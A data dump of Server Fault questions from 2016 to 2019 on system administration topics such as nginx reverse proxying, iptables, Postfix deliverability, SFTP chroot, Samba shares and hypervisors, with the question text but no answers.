"763456","How to add nginx in service if installed on /usr/local/nginx","<p>I have to compile nginx in order to get pagespeed module. But it appears that nginx is installed on /usr/local/nginx which I can't just use <code>service nginx restart</code> or try <code>nginx -V</code></p>

<p>Is there a way to make so that it is easier to start / stop the service and be able to check the version of nginx? I've read <a href=""https://www.nginx.com/resources/wiki/start/topics/tutorials/gettingstarted/"" rel=""nofollow noreferrer"">this doc</a> and I can do without it, or just edit my bashsrc to make things simpler. However, the most important part is to be able to verify that the compiled version of nginx I have has pagespeed included.</p>
","<nginx>","2016-03-13 13:56:41"
"978702","How to point NGINX to internal npm app with port","<p>I try to put up the Uppy Standalone Companion on a Scaleway instance. I managed to install Uppy and mananged to install Nginx with SSL but now I want the (sub)domain to load the Uppy Companion instead of the standard Nginx homepage. </p>

<p>I tried</p>

<pre><code>location / {
    proxy_pass http://127.0.0.1:3020;
}
</code></pre>

<p>When I start companion it shows its running on 0.0.0.0:3020 so I also tried </p>

<pre><code>location / {
    proxy_pass http://0.0.0.0:3020;
}
</code></pre>

<p>However, I won't get it to work. Below I've added my Nginx configuration file</p>

<pre><code># For more information on configuration, see:
#   * Official English Documentation: http://nginx.org/en/docs/
#   * Official Russian Documentation: http://nginx.org/ru/docs/

user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log;
pid /run/nginx.pid;

# Load dynamic modules. See /usr/share/nginx/README.dynamic.
include /usr/share/nginx/modules/*.conf;

events {
    worker_connections 1024;
}

http {
    log_format  main  '$remote_addr - $remote_user [$time_local] ""$request"" '
                      '$status $body_bytes_sent ""$http_referer"" '
                      '""$http_user_agent"" ""$http_x_forwarded_for""';

    access_log  /var/log/nginx/access.log  main;

    sendfile            on;
    tcp_nopush          on;
    tcp_nodelay         on;
    keepalive_timeout   65;
    types_hash_max_size 2048;

    include             /etc/nginx/mime.types;
    default_type        application/octet-stream;

    # Load modular configuration files from the /etc/nginx/conf.d directory.
    # See http://nginx.org/en/docs/ngx_core_module.html#include
    # for more information.
    include /etc/nginx/conf.d/*.conf;

    server {
        server_name  companion.mywebsite.com;
        root         /usr/share/nginx/html;

        # Load configuration files for the default server block.
        include /etc/nginx/default.d/*.conf;

        location / {
                proxy_pass http://0.0.0.0:3020;
        }

        error_page 404 /404.html;
            location = /40x.html {
        }

        error_page 500 502 503 504 /50x.html;
            location = /50x.html {
        }

    listen [::]:443 ssl ipv6only=on; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/companion.mywebsite.com/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/companion.mywebsite.com/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot

}


# Settings for a TLS enabled server.
#
#    server {
#        listen       443 ssl http2 default_server;
#        listen       [::]:443 ssl http2 default_server;
#        server_name  _;
#        root         /usr/share/nginx/html;
#
#        ssl_certificate ""/etc/pki/nginx/server.crt"";
#        ssl_certificate_key ""/etc/pki/nginx/private/server.key"";
#        ssl_session_cache shared:SSL:1m;
#        ssl_session_timeout  10m;
#        ssl_ciphers HIGH:!aNULL:!MD5;
#        ssl_prefer_server_ciphers on;
#
#        # Load configuration files for the default server block.
#        include /etc/nginx/default.d/*.conf;
#
#        location / {
#        }
#
#        error_page 404 /404.html;
#            location = /40x.html {
#        }
#
#        error_page 500 502 503 504 /50x.html;
#            location = /50x.html {
#        }
#    }



    server {
    if ($host = companion.mywebsite.com) {
        return 301 https://$host$request_uri;
    } # managed by Certbot


        listen       80 default_server;
        listen       [::]:80 default_server;
        server_name  companion.mywebsite.com;
    return 404; # managed by Certbot


}}





</code></pre>
","<linux><nginx><centos><ssl>","2019-08-10 08:33:45"
"763568","Windows 7 - VM resource usage","<p>I would like to ask a question about Virtualization and the performance impacts
As the title suggests I wish to VM Windows 7 for a work laptop and run linux on the backend to leverage some of its abilities it has over Windows, more specifically for drive recovery and security.
But I would like to ask what impact could I expect out of a VM system? and what limitations performance wise would a virtual drive encounter over phyiscally giving it a partition or own drive?</p>

<p>Thanks</p>
","<linux><virtualization><central-processing-unit>","2016-03-14 10:29:29"
"978765","A cost estimation for a Java WAR using AppEngine","<p>I read the following in the docs for Java appengine:</p>

<blockquote>
  <p>standard: Most cost-effective for applications that have significant
  periods where they are not serving traffic. </p>
  
  <p>flexible: No free tier. Application always has a minimum number of
  running instances. Most cost-effective for applications that serve
  traffic continuously.</p>
</blockquote>

<p>What does ""serve traffic continuously"" means? I'm asking because my WAR will not serve traffic continuously but it will need to ""stay up"" all the time because of caching.</p>

<p>Also, for flexible, I saw the following pricing:</p>

<blockquote>
  <p>vCPU  per core hour   $0.0526</p>
  
  <p>Memory    per GB hour     $0.0071</p>
  
  <p>Persistent disk   per GB per month    $0.0400</p>
</blockquote>

<p>Does the above means I should multiply each with *24*31 (month of uptime) in order to understand how much I'm going to pay?</p>

<p>For example: </p>

<p>2CPU = 0.0526 * 2 (cpus) * 24 (hours) * 31 (days in a month) = $78</p>

<p>2GB = 0.0071 * 2 (gb) * 24 (hours) * 31 (days in a month) = $10</p>

<p>1GB(disk) =  0.04 * 1 (month) = $0.04</p>

<p>A general question: Does Google cloud also serves a VPS-like computer where the user (me) can install what he wants? If so, where can I read about it?</p>
","<google-app-engine>","2019-08-11 08:26:38"
"763570","What's a good way to schedule scripts that depend on each other?","<p>So, I have a few scripts that need to be executed in order, and they need to wait for the previous script to finish since they need the data it gathers.</p>

<p>I thought about putting it all in a single script but I want to run it on a small VPS and it'd most likely run out of memory.</p>

<p>My first thought was about cron, but as the scripts depend on each other to finish first I'm not sure how I'd schedule them.</p>

<p>Then I thought about Celery, but it says it's focused on real time stuff and it seems a bit of an overkill for what I want.</p>

<p>Is there something simpler than Celery that I could use to achieve this?</p>
","<scheduled-task><queue>","2016-03-14 10:45:07"
"854520","dovecot mail storage auto detection failed","<p>I setup a new user called sales, and gave it a password. Although it has a home directory, i set login to /sbin/nologin.</p>

<pre><code>dovecot: pop3-login: Login: user=&lt;sales&gt;, method=PLAIN, rip=127.0.0.1,   lip=127.0.0.1, mpid=12938, secured, session=&lt;94SotWVRoAB/AAAB&gt;
Jun  7 21:49:24 www dovecot: pop3(sales): Error: user sales: Initialization failed: Namespace '': Mail storage autodetection failed with home=/home/sales
Jun  7 21:49:24 www dovecot: pop3(sales): Error: Invalid user settings. Refer to server log for more information.
</code></pre>

<p>Did i have to initialise the mailbox in the homedirectory? What did i forget. I didn't change anything to the default dovecot.conf, i just installed the package with yum install dovecot (so latest version).</p>

<p>Thanks for your help.</p>
","<dovecot>","2017-06-07 22:04:52"
"763652","Outlook File used by another program and unable to fix","<p>I have a corrupted pst file. I used norton go back to get older version of pst file. Scanpst tool did not work. The error message was file was used by another program. the task manager shows no other program operating. Would any of the virus program or spy ware be using. how do i change file out?</p>
","<outlook>","2016-03-14 15:52:56"
"763658","icacls adding SID instead of friendly name","<p>I need to apply the icacls command from a server in the network, for example, server001 to a folder that is on server002. The objective is to add a local security group  of server002 on a folder that is on that server, but run the command from the server001. Right now I have the following command:</p>

<pre><code>icacls ""\\server002\G$\permissionTest"" /grant ""The local group"":(OI)(CI)RX
</code></pre>

<p>It applies the permissions, but in the ACL of the permissionTest folder on server002 I just see the SID of the group, and I need to see it on the friendly form.</p>

<p>Could someone please tell me how to do it?</p>
","<windows-server-2008><security><icacls>","2016-03-14 16:07:23"
"934446","Changing VMware Network Configuration","<p>I am in an apartment that PavlovMedia provides DHCP; however, I'm trying to configure my own private network with a pfSense virtual machine as a gateway.  Mainly, I just want to use DHCP from my Windows Server instead of Pavlov Media's without going out to buy a new router.  Here is the planned <a href=""https://i.sstatic.net/3osCx.png"" rel=""nofollow noreferrer"">Network Config</a></p>

<p>I have Windows Server running DNS and DHCP, with a VMware virtual machine running pfSense. If I have the Windows server connected to the unmanaged switch, the unmanaged switch connected straight into wall jack (Pavlov Media), my machines aren't guaranteed to use Windows as the DHCP server, which is why I don't use <a href=""https://i.sstatic.net/PoRMB.png"" rel=""nofollow noreferrer"">This Config</a>. The issue, in theory, is bridging the pfSense VM to both the outside network (Pavlov) and the LAN network, shown <a href=""https://i.sstatic.net/kN9IK.png"" rel=""nofollow noreferrer"">here</a>. I don't think creating another network adapter on VMware for pfSense and simply connecting it only the host will work.</p>
","<windows-server-2016><pfsense><vmware-workstation>","2018-10-08 07:06:18"
"934449","Nginx configuration to prevent spam connections on HTTP long polling endpoint","<p>I have a HTTP long polling endpoint that anyone can connect to for updates. The nature of the application requires the solution to be open, it cannot sit behind any form of authentication. The server accepts a maximum of 1000 connections, but currently there is nothing stoping one person from spamming all 1000 connections. </p>

<p>Is there any nginx configuration options that can be used to attempt to limit one connection per user? </p>
","<nginx><long-polling>","2018-10-08 07:43:13"
"978958","rm -rf until success","<p>I have a deployment script that removes all files in a tmp folder before continuing, but sometimes during the deployment, a process will use one of the tmp files, making the <code>rm</code>command fail. This is how my script looks like</p>

<pre><code>rm -rf app/tmp
tar -xf app.tar
</code></pre>

<p>That is an over-simplification of what is happening, please don't try to suggest improving the deployment process, this is strictly a question about the <code>rm</code> command</p>

<p>I am thinking of something like</p>

<pre><code># pseudo code
while [[ ! rm -rf app/tmp ]]; do sleep 1; done
tar -xf app.tar
</code></pre>

<p>In other words: continue to try to delete folder until nobody added files there, then continue the script.</p>

<p>Do you know of a syntax that would allow this in bash?</p>

<p>Currently the script fails and never extracts the tar files.</p>

<p>Thanks for your input here.</p>
","<bash><rm>","2019-08-12 18:44:19"
"978991","Why do cloundfront signed urls and cookies require account root?","<p>According to <a href=""https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-trusted-signers.html#private-content-creating-cloudfront-key-pairs"" rel=""nofollow noreferrer"">this documentation</a> for generating key pairs for use with <a href=""https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/PrivateContent.html"" rel=""nofollow noreferrer"">Cloudfront Signed URLs and Signed Cookies</a> root credentials are required to either generate or upload key pairs. Other key pairs used with AWS, such as EC2 authentication key pairs, do not require special elivated root credentials. Is there something special about signing this category object (urls, cookies) that requires special authority?</p>

<p>The closest I can get to an answer is by way of metaphor to other types of proofs of control, such as when DNS TXT entries are used to prove control of a domain during a certificate signing request. In my mind this still falls short of requiring root credentials in the case at hand and I do not see how requiring root proves ownership of anything substantial over and above what a standard IAM user proves.</p>

<p>I'd appreciate any insights. Thanks for reading.</p>
","<amazon-web-services><amazon-cloudfront>","2019-08-12 22:15:24"
"763783","distributed storage solutions","<p>I've got some desktop PCs available in my company since the last user hardware renewal and I would like to re-use them for a demo plaform.  They are powerfull enought to emulate a few servers.  I guess I could do some virtualization farm, however I've got no available NAS nor SAN for them to connect to.  And I need a shared storage among the nodes to provide hot-migration.</p>

<p>So here's my question, what are the options to build a shared storage among approx. 10 nodes?  Should I consider GlusterFS?  Are Ceph and also HDFS to be considered for that purpose and why?  Are there other tricks out there that have been tested, possibly with ZFS?  I could even consider building a RAID among the nodes myself using software raid and iSCSI.</p>

<p>The objective is to build congruent systems with both, virtualization AND storage on the nodes.  So if loose one node, both failover capabilities come in action.</p>

<p>Thanks</p>
","<distributed-filesystems><shared-storage><distributed-computing><cluster-shared-volumes>","2016-03-15 07:29:56"
"763808","ZyXEL switch management port configuration","<p>I'm a total newbie in configuring a network switch and I would like to know how can I configure the management port of a ZyXEL switch.</p>

<p>I have a ZyXEL XGS3700-24 model and I set an IP address like 192.168.3.X where the web interface answer and I can connect with a browser, entering with admin user.</p>

<p>Since I have a management port I tried to configure it with an IP address on a different subnet (192.168.4.X) but when I try to connect to that port I can't reach it.</p>

<p>I wonder if I missed something when I first configured the MGMT port, into the ""IP Setup"" menu I set the IP address, the subnet mask and the gateway address, there's also a field as ""Default Management"" where I can set ""in-band"" or ""out-of-band"" value but I don't know which is the right setup.</p>

<p>Please could someone give me a little explanation of how a ZyXEL MGMT port works and how can I configure it?</p>
","<networking><port><switch><zyxel>","2016-03-15 09:37:17"
"979056","Can a HP P2000 G3 SAN with SAS controller direct connect to a Dell PowerEdge Server with a Dell brand HBA","<p>I am building a home rig and have recently acquired an HP P2000 G3 SAN with SAS controllers. I appreciate these are supposed to connect into a DL380 G7 or G8 with the HP branded SAS interface card (sc08e) but I have a Dell PowerEdge R710 server. I'm wondering, if I purchased a dell SAS card like a Perc H200e, would I be able to directly connect the SAN in a similar way?</p>
","<storage-area-network><dell-poweredge><dell-perc><hp-modular-smart-array>","2019-08-13 09:48:30"
"854731","Special user account for logon script only","<p>How can I create a user account which can logon to a domain and only be able to let the logon script run (netlogon) and then log out automatically? This user needs to be as restricted as possible.</p>

<p>What are the possibilities?</p>
","<windows-server-2008-r2><user-accounts><logon-scripts>","2017-06-08 19:30:12"
"934594","How can I abort a telnet connection attempt?","<p>Suppose I execute the following in command prompt:</p>

<blockquote>
  <p>telnet XXX.XXX.XXX.XXX 80</p>
</blockquote>

<p>half a second later, I realize it would never connect (for whatever reason). I want to abort the connection <em>attempt</em> instead of waiting for it to timeout.</p>

<p>Pressing either <code>Ctrl + c</code>, <code>Ctrl + ]</code>, <code>Ctrl + q</code> or <code>quit</code> does nothing.</p>
","<windows><telnet>","2018-10-09 04:27:36"
"979192","Centos 7 - SSL without virtual host","<p>so after many many hours I somehow manage to repair/reinstall whole VPS, sweting my blood literally.</p>

<p>Now last step setting up SSL - ultra cautious, because I think, last time here I manage to fk up, with virtual host and etc. It´s my first time working with server so google is my dev/debug/etc but now  I´m too afraid to go by those steps. </p>

<p>So I Woud like to ask more experience users, how to set up SSl [without virtual host]. </p>

<p>Many thanks!!</p>

<p>Michael</p>
","<centos><ssl><ssl-certificate><certificate>","2019-08-14 06:44:29"
"763981","connect to smb share with root access","<p>Ok, I have smb configured on my Centos 6.7 environment, I have added the user root with smbpasswd -a and when I browse to the share from my windows box I connect with the samba root user I created a password for, but I don't have linux root permissions when I click on the directories. As you can see below, I want to have access to /. Here is the config:</p>

<pre><code>[Daze]
comment = Default connect
path = /
valid users = admin root 
force user = root
force group = root
browsable = yes
admin users = root, root
public = yes
writable = yes
create mask = 0777
read only = No
directory mode = 0777
</code></pre>

<p>Thanks in advance for your help!</p>
","<samba><samba4><smb-conf>","2016-03-15 23:19:58"
"764024","How to identify NICs that are connected to the same machine","<p>If we have multiple lan cards installed in our server in which any one is connected with lan.can we identify that by command</p>
","<linux><networking>","2016-03-16 07:50:25"
"854975","What can we do to infer if a currently unmounted directory under / has ever been mounted? Thanks","<p>Is there any way to check whether a directory has once been mounted? Thanks.</p>
","<linux><filesystems><mount>","2017-06-10 03:55:59"
"934805","Emails from my server are considered as spam on hotmail","<p>Well all is in the title. How to be removed from their spam list? We don't use external email provider for now. We respect emails good practices: signed email, unsubscribe link, dest email...</p>

<p>Here are different tests, nothing bad reported: </p>

<ul>
<li><a href=""https://sitecheck.sucuri.net/results/tokeeen.com"" rel=""nofollow noreferrer"">https://sitecheck.sucuri.net/results/tokeeen.com</a></li>
<li><a href=""https://www.scamadviser.com/check-website/tokeeen.com"" rel=""nofollow noreferrer"">https://www.scamadviser.com/check-website/tokeeen.com</a></li>
<li><a href=""https://mxtoolbox.com/SuperTool.aspx?action=blacklist%3atokeeen.com&amp;run=toolpage"" rel=""nofollow noreferrer"">https://mxtoolbox.com/SuperTool.aspx?action=blacklist%3atokeeen.com&amp;run=toolpage</a></li>
</ul>

<p>Can we contact Microsoft for a manuel check?</p>
","<email><spam><gdpr>","2018-10-10 09:49:27"
"854993","Setup system server to manage other systems","<p>I'm working in small organization. I want to setup a network of systems to manage systems like creating and managing users, password management. I'm aware that I'll need to use Windows server for managing. Please let me know how to do it.</p>
","<windows><active-directory>","2017-06-10 08:11:50"
"764072","Iptables DNS Input on localhost","<p>Currently my IPtables Input chain settings on the server are:</p>

<pre><code>Chain INPUT (policy DROP 6 packets, 588 bytes)
 pkts bytes target     prot opt in     out     source               destination
  202 20660 ACCEPT     all  --  lo     any     anywhere             anywhere
    8   536 ACCEPT     tcp  --  any    any     anywhere             anywhere            tcp dpt:ssh
   10  2345 ACCEPT     tcp  --  any    any     anywhere             anywhere            tcp dpt:https
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere            tcp dpt:http
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere            tcp dpt:8050
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere            tcp dpt:8123

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere            tcp dpt:webcache
    0     0 REJECT     all  --  any    any     anywhere             anywhere            reject-with icmp-host-prohibited

Chain OUTPUT (policy ACCEPT 222 packets, 23444 bytes)
 pkts bytes target     prot opt in     out     source               destination
</code></pre>

<p>If i try to ping for example Port 8123 on this server with</p>

<pre><code>ping 127.0.0.1 -p 8123 
</code></pre>

<p>it is working, but not with a fqdn, for exmaple</p>

<pre><code>ping foo.bar.de -p 8123
</code></pre>

<p>A ping from my laptop to the server with the fqdn is also working. The Output chain is completely open, and if i change the policy in the Input Chain from Drop to Accept, the ping from localhost with fqdn is also working. So in my opinion something in the Input chain config is not correct currently. </p>

<p>I have already tried to allow some port 53 settings, but without any luck.</p>

<pre><code>iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 53 -j ACCEPT
iptables -A INPUT -m state --state NEW -m udp -p udp --dport 53 -j ACCEPT
</code></pre>

<p>I have also logged the blocked things from the Input Chain with</p>

<pre><code>iptables -A INPUT -m limit --limit 2/min -j LOG --log-prefix ""IPTables-Dropped: "" --log-level 4
</code></pre>

<p>The output in var/log/messages is something like</p>

<pre><code>Mar 16 12:22:05 bla kernel: IPTables-Dropped: IN=eth0 OUT= MAC=XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX SRC=XX.XX.XX.XXX DST=XX.XX.XX.XX LEN=92 TOS=0x00 PREC=0x00 TTL=60 ID=25578 DF PROTO=UDP SPT=53 DPT=46139 LEN=72
</code></pre>

<p>Can you help me, so that the ping on the localhost with the fqdn is working?</p>
","<iptables><centos6.4>","2016-03-16 11:42:40"
"979367","Postfix GMail bouncing with ""very low reputation of sending IP""","<p>i'm using a Debian 9 with Postfix and i've got issues with my mails sending to google mail.</p>

<p>After sending a mail, i will instantly get a response: ""Undelivered Mail Returned to Sender"".</p>

<blockquote>
  <p>Our System has detected that this message is 550-5.7.1 likely suspicious due to the very low reputation of the sending IP 550-5.7.1 address. To best protect our users from spam, the mssage has been 550-5.7.1 blocked.</p>
</blockquote>

<p>My score on mail-tester.com is 10/10 (the only warning stated is a missing unsubscribe link).</p>

<p>I've added an SPF-Record, a DKIM Signature and DMARC-Record.
A reverse DNS entry is also added.</p>

<p>I've looked up several blacklist and all stated that i'm good to go.</p>

<p>I was wondering if the issue would solve itself after some time. The Mailserver was setup ~three weeks ago and after two weeks, mails were accepted from gmail for a few hours (going in gmails junk-folder, but at least no bounce). A bit later they were getting bounced again.</p>

<p>Google Postmaster-Tools doesnt show anything due to low message amount (as those are just private mail accounts, no bulk/newsletter mails).</p>

<p>Is there anything else I could have missed?</p>

<p>Thanks for your time!</p>
","<postfix>","2019-08-15 07:45:51"
"979379","Syncing time between server and a device","<p>I am doing an IoT project. My IoT device (hardware with Arduino) is measuring some temperature information every minutes. And sending these data to the server. Hardware has a display. That shows the temperature value and the time. I want to sync this time with the server time. I can't use NTP as I am not working with UDP. Can I use HTTP to syn time? any suggestions please</p>
","<apache-2.2><mysql><http>","2019-08-15 10:03:20"
"979429","Nginx SSL fail Expecting any private key","<p>I'm having trouble configuring my SSL to use with nginx. I'm not sure how to solve the problem, is there anyone someone might know the solution or can put me on the right track? </p>

<p><strong>Error</strong></p>

<pre><code>nginx: [emerg] SSL_CTX_use_PrivateKey_file(""/etc/nginx/ssl/test.key"") failed (SSL: error:0906D06C:PEM routines:PEM_read_bio:no start line:Expecting: ANY PRIVATE KEY error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib)
</code></pre>

<p><strong>nginx config</strong></p>

<pre><code>listen   443 ssl;
ssl_certificate       /etc/nginx/ssl/test.crt;
ssl_certificate_key   /etc/nginx/ssl/test.key;
</code></pre>

<p><strong>ausearch -m avc -ts today | audit2allow</strong></p>

<pre><code>#============= httpd_t ==============

#!!!! This avc is allowed in the current policy
allow httpd_t user_home_t:file read;
</code></pre>
","<nginx><ssl><ssl-certificate>","2019-08-15 17:08:55"
"764158","SPF record for relay server","<p>Obviously my own mail servers should be marked as ""allow"" in an SPF record, but I'm not so sure about mail relays (e.g. my ISP). Since other people (not related at all with my server) also send email through the same relay, it seems to me the most appropriate choice would be listing the relays as ""neutral"" like: </p>

<pre><code>v=spf1 ip4:myserverip ?include:_spf.myisp.com -all
</code></pre>

<p>Is this common practice? Or is there some better option? </p>
","<email><email-server><spf>","2016-03-16 16:37:53"
"934921","How to license a server with two processors, 16 cores and Windows Server 2016 Standard?","<p>I'm a bit confused by the Windows Server 2016 per core licensing model. I've a server with two processors and 16 cores, which I want to use as a Hyper-V host with 5 guests.</p>

<p>Now I can buy <a href=""https://rads.stackoverflow.com/amzn/click/B01M1L0YJL"" rel=""nofollow noreferrer"">Windows Server 2016 Standard</a> licenses for 16 cores. So it means I've licensed all cores. From each Windows Server Standard license I can get two virtualized machines. So I buy two additional licenses to cover the 5 guests?</p>
","<windows-server-2016><licensing>","2018-10-10 20:39:55"
"855094","Is KVM a type 1 or type 2 hypervisor?","<p><strong>Is KVM a type 1 or a type 2 hypervisor?</strong></p>

<p>I understand that type 1 hypervisors run on bare metal while type 2 hypervisors are applications running on top of an operating system (such as VMware Workstation). I also understand that the performance difference between type 1 and type 2 clients can be significant.</p>

<p>I am confused as if KVM is type 1 or 2 as I understand that a desktop environment can be installed in dom0.</p>
","<virtualization><redhat><kvm-virtualization><xen>","2017-06-11 06:35:30"
"855114","sftp with chroot without ssh access","<p>I'm trying to have some users able to sftp but not ssh. I've looked at <a href=""https://serverfault.com/questions/660160/openssh-difference-between-internal-sftp-and-sftp-server"">OpenSSH: Difference between internal-sftp and sftp-server</a> and <a href=""https://serverfault.com/questions/671860/trying-to-chrootdirectory-an-sftp-user-to-their-home-directory#671868"">Trying to ChrootDirectory an SFTP user to their home directory</a></p>

<p>Inside of sshd_config I have the lines </p>

<pre><code> Subsystem sftp internal-sftp
 AllowUsers &lt;a bunch of users&gt;

 Match group sftponly
      ChrootDirectory /home/%u
      X11Forwarding no
      AllowTcpForwarding no
      ForceCommand internal-sftp
</code></pre>

<p>Filezilla gives me </p>

<pre><code> Error: Network error: Software caused connection abort
 Error: Could not connect to server
</code></pre>

<p>When I comment out the <code>ChrootDirectory /home/%u</code>
I am able to connect fine. </p>

<p>How can I chroot?</p>
","<ssh><sftp><chroot>","2017-06-11 11:05:25"
"855165","XServer, remote Debian workstation","<p>I wish to set up a headless workstation machine running Debian Linux. I'd like to actually run XServer on another machine. Think thin-client, though the ""thin client"" machine is actually fairly beefy. To the maximum extent possible, I want the thin client machine to <em>feel</em> like I'm doing everything locally, while actually storing all files (apart from config, cache and maybe ssh private keys, I suppose) on the remote workstation and doing all the CPU processing on the remote workstation. The two computers are hooked up on a LAN.</p>

<p>So, thin client for keyboard input, mouse input, and displaying the GUI. Everything else (desktop manager, all software, all processing) on the workstation.</p>

<p>How do I accomplish this? VNC doesn't really fit as it requires (or seems to require) I sign in locally, on the workstation, then just echo the desktop remotely. I could use ssh, but that requires that I run a full desktop environment on the thin client machine, but I really want as little as possible there.</p>

<p>I don't need hand-holding, I'm just not sure what my options are. It's obviously possible, we used to do this back in the early 90s, I just don't know how. The thin client has plenty of hard drive space, plenty of CPU power, and 32GB of RAM, it's just that the workstation is more powerful. And better controlled. But sits in a closet, without a monitor.</p>
","<debian><remote-desktop><xserver>","2017-06-11 21:25:46"
"764272","AWS SSL vs Comodo (or other)","<p>Is there an advantage or reasons for choosing to use a paid SSL certificate from Comodo (or another) over using the new AWS Certificate Manager (free SSL certificates)?</p>

<p>I'm specifically talking about Domain Validated SSL (not Organizational or Extended Validation)</p>
","<ssl>","2016-03-17 04:37:43"
"855214","Can a computer with Kaby Lake processor run Windows 7 in a virtual machine?","<p>My boss bought computers with Kaby Lake processors for a project. Only later did we find out that the project requires components that will not work with Windows 10 (and do work with Windows 7) and their developer is unlikely to release new components compatible with Windows 10. We are looking at various options and want to know whether this (running Windows 7 in a virtual machine) is feasible.</p>
","<windows-7><virtualization><central-processing-unit><windows-10>","2017-06-12 09:06:51"
"935088","HTTPS - Can my Employer/ISP read my Gmail / WhatsApp Web messages","<p>I'm going to try to keep this as short as possible, but if you need any additional context or information, don't hesitate to ask. Also, if this is not the correct SE platform for this question, please point me in the right direction.</p>

<p>Can the server admins / ISP / anyone else read the content of my Gmails, WhatsApp Web messages, or any other communications on platforms that use HTTPS?</p>

<p>My understanding of HTTPS is that it is not possible but I'm not entirely sure. </p>

<ul>
<li>If it is possible, how easy would it be to do so? </li>
<li>If it's not possible, is there any software that an employer might install on the network / employee PCs to break, beat or otherwise overcome the encryption of HTTPS?</li>
<li>If not through software, what other means might an employer make use of to overcome HTTPS?</li>
</ul>
","<security><https>","2018-10-11 15:47:05"
"764410","“Proxy” for streaming video","<p>I am investigating playing live streamed video at an event venue, to a large number of Wifi connected devices. Set up would be:</p>

<p>Camera -> PC -> cloud streaming server (like Wowza) -> wifi AP -> devices</p>

<p>I'm trying to figure out how to affordably maximise the number of devices that can consume the stream in a single venue.</p>

<p>If the video stream bitrate is 5 Mbps then having the internet connection quickly becomes the bottleneck; with a limit of 20 users on a 100 Mbps connection.</p>

<p>I'm wondering if I could set-up some kind of proxy for the video stream, that would cache the stream locally to the venue and then the devices could connect to that instead.</p>

<p>In searching for solutions I came across a hardware proxy that could do this, but it was 10's of thousands of pounds which is not viable for my budget.</p>

<p>So, I'm wondering is there is a server software solution?</p>

<p>Secondly I've been trying to find out the limits on Wifi APs. Standard APs appear to top out at ~100 users and are then limited by their ethernet connection - say 1 Gbit.</p>

<p>Is it possible to set up an AP that can use a 10 Gbit ethernet and can handle order 1000 connections?</p>

<p>Thanks for any pointers.</p>
","<networking><proxy><streaming><video>","2016-03-17 17:35:50"
"979664","Why are changes to DNS not published as a log?","<p>I was wondering why it is so difficult to keep up to date with DNS and why the various servers don't simply stream a log of updates to a public file server.</p>

<p>Is there a reason for this?</p>
","<domain-name-system>","2019-08-17 20:43:44"
"855363","Why is iptable necessary if i can trust my server installation?","<p>I'm trying to get i bit more into security's best practices for my personal knowledge.</p>

<p>Actually i'm not able to understand the necessity of configuring a Firewall like iptable if i can trust my server's setup.</p>

<p>In my actual state of mind, this can be explained this way:
If i know that only:</p>

<ul>
<li>A web server listening on port 80</li>
<li>A ssh server listening on port 22</li>
<li>An api server listening on port 8080</li>
</ul>

<p>are running on my server, any incoming trafic on my (only) ethernet adapter eth0 that does not use port 80, 22 or 8080 will get lost because there is no process listening on those ports.  </p>

<p>This mean nothing consuming the incoming packets, so they are simply droped.</p>

<p>With that in mind, i do not understand the necessity of configuring iptable to accept only tcp traffic on port 80, 22 and 8080.</p>

<p>This was all before i watch this great video:<br>
<a href=""https://serversforhackers.com/video/firewalls-basics-of-iptables"" rel=""nofollow noreferrer"">https://serversforhackers.com/video/firewalls-basics-of-iptables</a></p>

<p>The video present how to setup an iptable config to do exactly that:
Only accept incoming traffic on port 80, 22 and 8080 and drop all others input packets.</p>

<p>I guess that there is a reason to do that, but i can't actually find it.</p>

<p>Can you explain why is this iptable configuration is needed ?</p>

<p>Is there differences between a packet drop by iptable and a packet not 'consumed' by any application running on the server?</p>

<p>Thanks a lot.</p>
","<iptables><firewall><linux-networking>","2017-06-12 21:06:23"
"935271","Networking bits to number of subnets","<p>How does one use the value of networking bits of a class A address to find the number of subnet bits and host bits? For example, with a subnet mask of /22, what would be the process of finding the host bits and subnet bits?</p>

<p>*I know a class C address would be networking bits - 24 = subnet bits and 8-subnet bits = host bits. This method doesn't work directly for class A addresses.</p>
","<networking><subnet><ip-address><network-design>","2018-10-12 15:06:25"
"855385","How to download SSH keys in Debian on GCP?","<p>I'm trying to download my SSH keys so that I can use Filezilla to connect to my webserver. This SHOULD be pretty straightforward - but everything I've tried has failed.</p>

<p>I currently have access to the etc/ssh directory through an SSH connection. I can see the files the folder - but I'm unclear which one is the correct key file.</p>

<p>Secondly, how do I download a file through terminal from SSH?</p>

<p>Thanks in advance!</p>
","<debian><ssh-keys><google-cloud-platform>","2017-06-12 22:13:56"
"764784","env not working in FreeBSD cronjob","<p>On my FreeBSD server, I have setup a cron script for backups using Duplicity. This script is as follows:</p>

<pre><code>#!/bin/sh

export PASSPHRASE=
export FTP_PASSWORD=

keyid=
remote=
excludelist=

/usr/local/bin/duplicity --volsize 1000 --max-blocksize=20480 --asynchronous-upload --full-if-older-than 1M --encrypt-key ""$keyid"" --exclude-filelist ""$excludelist"" /Data ""$remote""

/usr/local/bin/duplicity --force remove-all-but-n-full 1 ""$remote""

unset FTP_PASSWORD
unset PASSPHRASE
</code></pre>

<p>(sensitive data redacted, of course).</p>

<p>This script is located at /etc/periodic/daily/duplicity and works fine if I run it directly from the terminal. But it doesn't work when cron/periodic runs it, and that seems te be because <code>env</code> is not functioning correctly.</p>

<p>Initially, the hashbang of the script read <code>#!/usr/bin/env sh</code>, but that resulted in the error <code>env: sh: No such file or directory</code>. So I changed it to the direct path of sh.</p>

<p>The problem I'm currently having is that duplicity uses <code>env</code> internally. So currently, I get the error <code>env: python2: No such file or directory</code> when cron tries to run it.</p>

